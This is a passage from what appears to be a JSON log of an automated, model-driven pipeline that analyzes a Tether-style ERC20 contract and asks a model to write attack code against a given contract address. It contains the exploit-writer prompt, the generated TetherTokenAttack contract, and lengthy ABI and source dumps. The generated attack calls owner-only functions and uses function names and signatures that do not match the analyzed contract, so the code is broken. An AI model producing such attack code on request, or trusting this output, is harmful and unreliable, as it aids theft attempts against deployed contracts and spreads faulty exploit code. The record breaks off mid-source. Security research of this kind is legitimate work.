transfer functions that could cause reentrancy.  \n- No payable functions accepting ETH, so no direct ETH theft risk.\n\n**H. Short Address Attack Mitigation**  \n- The `onlyPayloadSize` modifier is used to prevent short address attacks on transfer, transferFrom, and approve.\n\n---\n\n3.', 'exploitation_requirements': '- **Owner Key Compromise**: The main risk vector is compromise or malicious behavior of the owner account. If an attacker gains control of the owner key, they can:  \n  - Pause the contract, freezing all transfers.  \n  - Blacklist arbitrary users and destroy their tokens.  \n  - Issue new tokens to inflate supply and potentially dump them.  \n  - Redeem tokens from owner balance to reduce supply arbitrarily.  \n  - Change fee parameters within limits.  \n  - Deprecate the contract and redirect logic to a malicious upgraded contract.\n\n- **No direct user-exploitable bugs**: There is no direct vulnerability exploitable by regular users or attackers without owner privileges. The contract logic is standard and uses SafeMath.\n\n- **Setup for Exploitation**:  \n  - The attacker must gain control of the owner private key or the owner must act maliciously.  \n  - No other setup is needed.', 'analysis_duration': 41.94789361953735}, 'attack': {'attack_prompt': "\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: The analyzed contract is **TetherToken**, an ERC20 token implementation with additional features such as pausability, blacklisting, token upgradeability, and adjustable fees. It inherits from multiple contracts: `Pausable`, `StandardToken`, and `BlackList`. The contract holds token balances and can be used to transfer tokens, approve allowances, and manage token supply via issuing and redeeming tokens. It also supports pausing all token transfers and blacklisting addresses to restrict their token operations. The contract supports deprecation, forwarding calls to an upgraded contract address.\n\nKey features and business logic:  \n- Token transfers with optional fees (basis points and max fee).  \n- Pausable functionality controlled by the owner.  \n- Blacklist mechanism to block malicious users and destroy their tokens.  \n- Ability to issue and redeem tokens by the owner, affecting total supply.  \n- Upgradeability via deprecate function, forwarding calls to a new contract.  \n- Protection against ERC20 short address attack via `onlyPayloadSize` modifier.  \n- Fee parameters capped by hardcoded limits.  \n\nSolidity version:  \n```solidity\npragma solidity ^0.4.17;\n```\n\n---\n\n2.\n\nVulnerability Assessment: **A. Centralization / Owner Privileges**  \n- The owner has extensive control: can pause/unpause transfers, blacklist addresses, destroy blacklisted users‚Äô tokens, issue new tokens, redeem tokens, change fee parameters, and deprecate the contract.  \n- This centralization means the owner can arbitrarily freeze token transfers, confiscate tokens from blacklisted users, inflate or deflate supply, and redirect token logic to a new contract.  \n- While this may be intended, it poses a trust risk and potential for abuse or compromise.\n\n**B. Blacklist and Destroy Black Funds**  \n- The owner can blacklist any address and then destroy all tokens held by that address, reducing total supply.  \n- This is a powerful backdoor to confiscate tokens without user consent.  \n- No timelock or multi-signature protection is present on these critical functions.\n\n**C. Upgradeability and Deprecation**  \n- The `deprecate` function allows the owner to mark the contract as deprecated and set an upgraded contract address.  \n- After deprecation, all token operations forward to the upgraded contract.  \n- This means the owner can effectively replace the token logic at will, which could lead to malicious upgrades or loss of funds if the upgraded contract is malicious or buggy.\n\n**D. Pausable Mechanism**  \n- The owner can pause all token transfers, freezing user funds.  \n- No emergency recovery or decentralized control is implemented.\n\n**E. ERC20 Approve Race Condition Mitigation**  \n- The contract implements the known mitigation by requiring allowance to be zero before setting a new non-zero allowance.  \n- This is good practice, no issue here.\n\n**F. Fee Calculation and Limits**  \n- Fees are calculated as basis points of the transfer amount, capped by a maximum fee.  \n- The owner can set fees but only up to 0.2% (20 basis points) and max fee less than 50 tokens (scaled by decimals).  \n- This limit is hardcoded and prevents excessive fees.\n\n**G. No Reentrancy or Math Vulnerabilities**  \n- Uses SafeMath for all arithmetic operations, preventing overflows/underflows.  \n- No external calls in token transfer functions that could cause reentrancy.  \n- No payable functions accepting ETH, so no direct ETH theft risk.\n\n**H. Short Address Attack Mitigation**  \n- The `onlyPayloadSize` modifier is used to prevent short address attacks on transfer, transferFrom, and approve.\n\n---\n\n3.\n\nExploitation Requirements: - **Owner Key Compromise**: The main risk vector is compromise or malicious behavior of the owner account. If an attacker gains control of the owner key, they can:  \n  - Pause the contract, freezing all transfers.  \n  - Blacklist arbitrary users and destroy their tokens.  \n  - Issue new tokens to inflate supply and potentially dump them.  \n  - Redeem tokens from owner balance to reduce supply arbitrarily.  \n  - Change fee parameters within limits.  \n  - Deprecate the contract and redirect logic to a malicious upgraded contract.\n\n- **No direct user-exploitable bugs**: There is no direct vulnerability exploitable by regular users or attackers without owner privileges. The contract logic is standard and uses SafeMath.\n\n- **Setup for Exploitation**:  \n  - The attacker must gain control of the owner private key or the owner must act maliciously.  \n  - No other setup is needed.\n\n\nTarget Contract Address: 0xC89Ce4735882C9F0f0FE26686c53074E09B0D550\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named 'attack', 'exploit', or 'run')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.4.17\n", 'attack_raw_response': '```solidity\npragma solidity 0.4.17;\n\ninterface ITetherToken {\n    function pause() external;\n    function unpause() external;\n    function blacklist(address _evilUser) external;\n    function destroyBlackFunds(address _blackListedUser) external;\n    function issue(address _to, uint _amount) external;\n    function redeem(uint _amount) external;\n    function setParams(uint newBasisPoints, uint newMaxFee) external;\n    function deprecate(address _upgradedAddress) external;\n}\n\ncontract TetherTokenAttack {\n    ITetherToken public target;\n\n    function TetherTokenAttack(address _target) public {\n        target = ITetherToken(_target);\n    }\n\n    function attack(address victim, address upgradedContract, uint issueAmount, uint redeemAmount, uint newBasisPoints, uint newMaxFee) public {\n        target.pause();\n        target.blacklist(victim);\n        target.destroyBlackFunds(victim);\n        target.issue(this, issueAmount);\n        target.redeem(redeemAmount);\n        target.setParams(newBasisPoints, newMaxFee);\n        target.deprecate(upgradedContract);\n        target.unpause();\n    }\n}\n```', 'code': 'pragma solidity 0.4.17;\n\ninterface ITetherToken {\n    function pause() external;\n    function unpause() external;\n    function blacklist(address _evilUser) external;\n    function destroyBlackFunds(address _blackListedUser) external;\n    function issue(address _to, uint _amount) external;\n    function redeem(uint _amount) external;\n    function setParams(uint newBasisPoints, uint newMaxFee) external;\n    function deprecate(address _upgradedAddress) external;\n}\n\ncontract TetherTokenAttack {\n    ITetherToken public target;\n\n    function TetherTokenAttack(address _target) public {\n        target = ITetherToken(_target);\n    }\n\n    function attack(address victim, address upgradedContract, uint issueAmount, uint redeemAmount, uint newBasisPoints, uint newMaxFee) public {\n        target.pause();\n        target.blacklist(victim);\n        target.destroyBlackFunds(victim);\n        target.issue(this, issueAmount);\n        target.redeem(redeemAmount);\n        target.setParams(newBasisPoints, newMaxFee);\n        target.deprecate(upgradedContract);\n        target.unpause();\n    }\n}', 'code_type': 'solidity', 'attack_duration': 3.8316664695739746}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpn0n66fsk.sol",\n  "contracts": [\n    {\n      "contract_name": "Ownable",\n      "address": "0xC89Ce4735882C9F0f0FE26686c53074E09B0D550",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        }\n      ],\n      "functions": [\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0xC89Ce4735882C9F0f0FE26686c53074E09B0D550": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99873535860000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "Pausable",\n      "address": "0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb",\n      "abi": [\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99873535860000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "paused": false,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, 